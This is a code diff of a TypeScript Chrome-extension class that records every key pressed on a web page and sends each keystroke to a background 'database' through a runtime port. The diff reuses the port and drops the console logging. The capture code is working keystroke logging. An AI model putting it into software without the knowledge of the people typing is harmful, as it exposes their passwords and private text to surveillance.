@@ -2,90 +2,88 @@ export class KeystrokeTracker {
 
     private keyCode: number = 0;
     private keyName: string = "";
+    private port: any = null;
 
     /**
      * Register the keystroke tracker.
      */
     public register() {
-        let current: KeystrokeTracker = this;
+        let _this: KeystrokeTracker = this;
+
+        _this.port = chrome.runtime.connect({name: "requestSender"});
 
         /**
          * Create an EventListener that fires each time a key is pressed. Log the key that is pressed in the console.
          * @param event object that contains the required key information.
          */
         document.addEventListener("keyup", function (event) {
-            current.keyCode = event.keyCode;
+            _this.keyCode = event.keyCode;
 
-            switch (current.keyCode) {
+            switch (_this.keyCode) {
                 case  8:
-                    current.keyName = "[Backspace]";
+                    _this.keyName = "[Backspace]";
                     break;
                 case  9:
-                    current.keyName = "[Tab]";
+                    _this.keyName = "[Tab]";
                     break;
                 case 13:
-                    current.keyName = "[Enter]";
+                    _this.keyName = "[Enter]";
                     break;
                 case 16:
-                    current.keyName = "[Shift]";
+                    _this.keyName = "[Shift]";
                     break;
                 case 17:
-                    current.keyName = "[Control]";
+                    _this.keyName = "[Control]";
                     break;
                 case 18:
-                    current.keyName = "[Alt]";
+                    _this.keyName = "[Alt]";
                     break;
                 case 20:
-                    current.keyName = "[Caps Lock]";
+                    _this.keyName = "[Caps Lock]";
                     break;
                 case 27:
-                    current.keyName = "[Escape]";
+                    _this.keyName = "[Escape]";
                     break;
                 case 32:
-                    current.keyName = "[Space]";
+                    _this.keyName = "[Space]";
                     break;
                 case 33:
-                    current.keyName = "[Page Up]";
+                    _this.keyName = "[Page Up]";
                     break;
                 case 34:
-                    current.keyName = "[Page Down]";
+                    _this.keyName = "[Page Down]";
                     break;
                 case 35:
-                    current.keyName = "[End]";
+                    _this.keyName = "[End]";
                     break;
                 case 36:
-                    current.keyName = "[Home]";
+                    _this.keyName = "[Home]";
                     break;
                 case 45:
-                    current.keyName = "[Insert]";
+                    _this.keyName = "[Insert]";
                     break;
                 case 46:
-                    current.keyName = "[Delete]";
+                    _this.keyName = "[Delete]";
                     break;
                 default:
-                    current.keyName = String.fromCharCode(current.keyCode);
+                    _this.keyName = String.fromCharCode(_this.keyCode);
             }
 
-            current.logKeystroke();
+            _this.sendData();
         });
-        console.log("Registered Keystroke Tracker.");
-    }
-
-    /**
-     * Log the key that has been pressed and send it to the database.
-     */
-    public logKeystroke() {
-        this.sendData(this.keyName);
-        console.log("Keystroke: " + this.keyName);
     }
 
     /**
      * Send data to the database
-     * @param keyName name of the key that has been pressed.
      */
-    public sendData(keyName: string) {
-        // TODO: Implementations of URL and Session.
-        chrome.runtime.connect({name: "requestSender"}).postMessage({table: "keystroke_event/", data: {"url": "TODO",
-            "created_at": Date.now(), keyName: keyName, "session": "TODO"}});
+    public sendData() {
+        this.port.postMessage({
+            table: "keystroke-events/",
+            data: {
+                created_at: Date.now(),
+                keyName: this.keyName,
+                session: "" // Empty for now.
+            }
+        });
     }
 }
